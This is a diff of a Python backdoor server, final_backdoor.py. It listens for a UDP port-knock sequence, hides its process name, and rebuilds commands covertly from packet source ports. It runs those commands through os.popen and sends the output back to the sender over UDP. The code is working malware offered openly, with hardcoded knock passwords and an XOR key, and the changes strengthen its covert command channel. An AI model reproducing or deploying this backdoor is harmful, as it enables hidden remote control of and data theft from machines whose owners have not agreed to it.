@@ -1,30 +1,35 @@
-# ###########################################################################################################
-# #	SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
-##
-##	PROGRAM:		    backdoor
-##
-##	FUNCTIONS:		    xor_crypt
-##                      remoteExecute
-##
-##	LAST MODIFIED:		October 6, 2014
-##
-##	DESIGNERS:	        Zach Smoroden & Slade Solobay
-##
-##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
-##
-##	NOTES:
-##	This program listens for the client to send remote commands. They will be run, and the results sent
-##  	back to the client encrypted.
-##
-##  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
-##
-##	USAGE: python final_backdoor.py
-##
+###########################################################################################################
+# SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
+#
+# PROGRAM:		    backdoor
+#
+# FUNCTIONS:		    xor_crypt
+#                      remoteExecute
+#
+#	LAST MODIFIED:		October 6, 2014
+#
+#	DESIGNERS:	        Zach Smoroden & Slade Solobay
+#
+#	PROGRAMMERS:        Slade Solobay & Zach Smoroden
+#
+#	NOTES:
+#	This program listens for the client to send remote commands. They will be run, and the results sent
+#  	back to the client encrypted.
+#
+#  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
+#
+#	USAGE: python final_backdoor.py
+#
 ##############################################################################################################
 
 import setproctitle
 import sys
 import logging
+import re
+import socket
+import fcntl
+import struct
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time
@@ -52,14 +57,29 @@ KNOCK5 = 5075
 PASS5 = 'cfF^'
 
 CHANNEL = 80
+SEND_PORT = 443
 
 # Filter is tcpdump format
-FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK1, KNOCK2, KNOCK3, KNOCK4, KNOCK5, CHANNEL)
+FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK1, KNOCK2, KNOCK3, KNOCK4, KNOCK5,
+                                                                            CHANNEL)
 
 # Must make sure it is the same as the client
 ENCRYPTION_KEY = "zdehjk"
 ######################################################################
 knockSequence = 0
+command = ''
+cmdLen = 0
+
+
+
+
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
 
 ######################################################################
 ##	FUNCTION:	    xor_crypt
@@ -111,21 +131,43 @@ def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY):
 ######################################################################
 def remoteExecute(packet):
     global knockSequence
+    global command
+    global cmdLen
+
+
     if knockSequence != 5:
-        check_knock(packet[0][2].dport, xor_crypt(packet.load))
+        try:
+            check_knock(packet[0][2].dport, xor_crypt(packet.load))
+        except Exception as ex:
+            print ex.message
+            print packet.show()
         print "KnockSequence: {0}".format(knockSequence)
     else:
-        print "Running Command: " + xor_crypt(packet.load)
-        command = os.popen(xor_crypt(packet.load))
-        command_result = command.read()
-        print command_result
+        if cmdLen == 0:
+            cmdLen = packet[0][2].sport
+            #print cmdLen
+        else:
+            print len(command)
+            print 'Command Len: ' + str(cmdLen)
+            command += chr(packet[0][2].sport)
+            if len(command) == cmdLen:
+                print "Running Command: " + command
+                decrypt_command = os.popen(command)
+                command_result = decrypt_command.read()
+                print command_result
 
-        dest_ip = packet[0][1].src
-        print "Sending encrypted response.."
-        send(IP(dst=dest_ip) / UDP(sport=4444, dport=CHANNEL) / xor_crypt(command_result))
-        knockSequence = 0
-        return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
-
+                dest_ip = packet[0][1].src
+                print "Sending encrypted response.."
+                lines = re.split('\n', command_result)
+                for line in lines:
+                    try:
+                        send(IP(dst=dest_ip) / UDP(sport=4444, dport=SEND_PORT) / line)
+                    except Exception as ex:
+                        print ex.message
+                knockSequence = 0
+                cmdLen = 0
+                command = ''
+                return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
 
 ######################################################################
 ##	FUNCTION:	    set_proc_name
@@ -153,6 +195,7 @@ def set_proc_name(newname):
     buff = create_string_buffer(len(newname) + 1)
     buff.value = newname
     libc.prctl(15, byref(buff), 0, 0, 0)
+
 
 ######################################################################
 ##	FUNCTION:	    check_knock
@@ -224,6 +267,7 @@ def check_knock(port, password):
     elif knockSequence == 5:
         return knockSequence
 
+
 ######################################################################
 ##	FUNCTION:	    bad_knock
 ##
@@ -246,6 +290,8 @@ def bad_knock():
     global knockSequence
     knockSequence = 0
     return 0
+
+
 ######################################################################
 ##	FUNCTION:	    set_proc_name
 ##
